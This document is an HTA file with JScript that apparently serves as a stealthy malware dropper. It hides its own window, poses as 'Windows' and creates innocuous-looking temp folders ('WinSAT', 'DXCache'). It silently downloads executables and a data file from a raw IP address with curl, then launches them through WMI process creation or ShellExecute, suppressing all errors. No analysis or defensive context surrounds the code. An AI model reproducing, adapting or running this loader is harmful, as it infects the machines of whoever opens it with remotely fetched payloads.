<html>
<head>
<meta http-equiv="x-ua-compatible" content="ie=9">
<!--  -->
<HTA:APPLICATION ID="q" APPLICATIONNAME="Windows" BORDER="none" SHOWINTASKBAR="no" SYSMENU="no" WINDOWSTATE="minimize" />
<script language="JScript">
window.resizeTo(0,0);
window.moveTo(-32000,-32000);
try {
  var sh = new ActiveXObject("WScript.Shell");
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var drop = sh.ExpandEnvironmentStrings("%TEMP%") + "\\WinSAT";
  var ovDrop = sh.ExpandEnvironmentStrings("%TEMP%") + "\\DXCache";
  var curl = sh.ExpandEnvironmentStrings("%SystemRoot%") + "\\System32\\curl.exe";
  if (!fso.FolderExists(drop)) fso.CreateFolder(drop);
  if (!fso.FolderExists(ovDrop)) fso.CreateFolder(ovDrop);
  sh.CurrentDirectory = drop;
  var ovExe = ovDrop + "\\o.exe";
  var ovDat = ovDrop + "\\ov.dat";
  var pureExe = drop + "\\purelast.exe";
  sh.Run('"' + curl + '" -sL --connect-timeout 25 --max-time 240 -o "' + pureExe + '" http://79.110.49.129:8080/ayan/RuLnbcv9dlmEX7F6ez10.exe', 0, true);
  if (fso.FileExists(pureExe) && fso.GetFile(pureExe).Size > 1000000) {
    try {
      var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
      var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
      si.ShowWindow = 1;
      var proc = wmi.Get("Win32_Process");
      var inp = proc.Methods_("Create").inParameters.SpawnInstance_();
      inp.CommandLine = "purelast.exe";
      inp.CurrentDirectory = drop;
      inp.ProcessStartupInformation = si;
      proc.ExecMethod_("Create", inp);
    } catch (e2) {
      var app = new ActiveXObject("Shell.Application");
      app.ShellExecute("purelast.exe", "", drop, "open", 1);
    }
  }
  sh.Run('"' + curl + '" -sL --connect-timeout 25 --max-time 240 -o "' + ovExe + '" http://79.110.49.129:8080/ayan/p5wPgZnWF3LGjsEbYryf.exe', 0, true);
  sh.Run('"' + curl + '" -sL --connect-timeout 25 --max-time 240 -o "' + ovDat + '" http://79.110.49.129:8080/ayan/QFOltCgLKA0nGRcz6YmJ.dat', 0, true);
  if (fso.FileExists(ovExe) && fso.GetFile(ovExe).Size > 40000 && fso.FileExists(ovDat) && fso.GetFile(ovDat).Size > 1000000) sh.Run('"' + ovExe + '"', 0, false);
} catch (e) {}
window.close();
</script>
</head>
<body></body>
</html>
